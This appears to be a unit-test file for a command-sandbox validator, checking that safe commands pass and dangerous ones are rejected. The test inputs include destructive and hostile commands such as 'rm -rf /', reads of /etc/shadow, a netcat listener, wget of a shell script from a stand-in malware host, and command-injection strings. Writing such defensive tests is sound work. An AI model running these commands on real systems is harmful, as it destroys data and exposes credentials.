"""
Unit Tests — Kali Secure Sandbox v2.0

Tests cover:
    - Allowed command validation
    - Blocked pattern detection
    - High-risk detection
    - Command injection detection
    - Privilege escalation detection
    - Empty / malformed input handling
"""

import unittest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.analyzer import is_safe_command, detect_risk_level


class TestWhitelist(unittest.TestCase):
    """Test that allowed commands pass validation."""

    def test_whoami_allowed(self):
        safe, msg = is_safe_command("whoami")
        self.assertTrue(safe, msg)

    def test_ls_allowed(self):
        safe, msg = is_safe_command("ls -la")
        self.assertTrue(safe, msg)

    def test_uname_allowed(self):
        safe, msg = is_safe_command("uname -a")
        self.assertTrue(safe, msg)

    def test_date_allowed(self):
        safe, msg = is_safe_command("date")
        self.assertTrue(safe, msg)

    def test_echo_allowed(self):
        safe, msg = is_safe_command("echo hello")
        self.assertTrue(safe, msg)


class TestBlockedCommands(unittest.TestCase):
    """Test that dangerous commands are blocked."""

    def test_rm_blocked(self):
        safe, _ = is_safe_command("rm -rf /")
        self.assertFalse(safe)

    def test_nmap_blocked(self):
        safe, _ = is_safe_command("nmap 192.168.1.1")
        self.assertFalse(safe)

    def test_nc_blocked(self):
        safe, _ = is_safe_command("nc -lvp 4444")
        self.assertFalse(safe)

    def test_sudo_blocked(self):
        safe, _ = is_safe_command("sudo su")
        self.assertFalse(safe)

    def test_chmod_blocked(self):
        safe, _ = is_safe_command("chmod 777 /etc/passwd")
        self.assertFalse(safe)

    def test_shutdown_blocked(self):
        safe, _ = is_safe_command("shutdown -h now")
        self.assertFalse(safe)

    def test_passwd_blocked(self):
        safe, _ = is_safe_command("passwd root")
        self.assertFalse(safe)

    def test_not_whitelisted(self):
        safe, msg = is_safe_command("curl http://evil.com")
        self.assertFalse(safe)

    def test_wget_not_whitelisted(self):
        safe, _ = is_safe_command("wget http://malware.com/shell.sh")
        self.assertFalse(safe)


class TestCommandInjection(unittest.TestCase):
    """Test that command injection attempts are blocked."""

    def test_semicolon_injection(self):
        safe, _ = is_safe_command("ls; rm -rf /")
        self.assertFalse(safe)

    def test_double_ampersand_injection(self):
        safe, _ = is_safe_command("whoami && cat /etc/passwd")
        self.assertFalse(safe)

    def test_pipe_or_injection(self):
        safe, _ = is_safe_command("ls || nmap localhost")
        self.assertFalse(safe)

    def test_backtick_injection(self):
        safe, _ = is_safe_command("echo `id`")
        self.assertFalse(safe)

    def test_subshell_injection(self):
        safe, _ = is_safe_command("echo $(whoami)")
        self.assertFalse(safe)


class TestPythonEscapes(unittest.TestCase):
    """Test that Python/eval escapes are blocked."""

    def test_eval_blocked(self):
        safe, _ = is_safe_command("eval 'rm -rf /'")
        self.assertFalse(safe)

    def test_exec_blocked(self):
        safe, _ = is_safe_command("exec('import os')")
        self.assertFalse(safe)

    def test_os_escape_blocked(self):
        safe, _ = is_safe_command("python3 -c 'import os; os.system(\"rm -rf /\")'")
        self.assertFalse(safe)


class TestPathTraversal(unittest.TestCase):
    """Test that path traversal attempts are blocked."""

    def test_etc_shadow_blocked(self):
        safe, _ = is_safe_command("cat /etc/shadow")
        self.assertFalse(safe)

    def test_etc_passwd_blocked(self):
        safe, _ = is_safe_command("cat /etc/passwd")
        self.assertFalse(safe)

    def test_dotdot_blocked(self):
        safe, _ = is_safe_command("ls ../../etc")
        self.assertFalse(safe)


class TestHighRiskDetection(unittest.TestCase):
    """Test that high-risk commands are correctly classified."""

    def test_nmap_high_risk(self):
        risk = detect_risk_level("nmap -sV 192.168.1.1")
        self.assertEqual(risk, "HIGH")

    def test_msfconsole_high_risk(self):
        risk = detect_risk_level("msfconsole -r exploit.rc")
        self.assertEqual(risk, "HIGH")

    def test_eval_high_risk(self):
        risk = detect_risk_level("eval malicious_code")
        self.assertEqual(risk, "HIGH")

    def test_whoami_low_risk(self):
        risk = detect_risk_level("whoami")
        self.assertEqual(risk, "LOW")

    def test_ls_low_risk(self):
        risk = detect_risk_level("ls -la")
        self.assertEqual(risk, "LOW")


class TestEdgeCases(unittest.TestCase):
    """Test edge cases and boundary conditions."""

    def test_empty_input(self):
        safe, msg = is_safe_command("")
        self.assertFalse(safe)
        self.assertIn("Empty", msg)

    def test_whitespace_only(self):
        safe, msg = is_safe_command("   ")
        self.assertFalse(safe)

    def test_case_insensitive_block(self):
        safe, _ = is_safe_command("NMAP 192.168.1.1")
        self.assertFalse(safe)

    def test_mixed_case_sudo(self):
        safe, _ = is_safe_command("SUDO su")
        self.assertFalse(safe)


if __name__ == "__main__":
    print("="*60)
    print("  KALI SECURE SANDBOX — UNIT TESTS")
    print("="*60)
    unittest.main(verbosity=2)
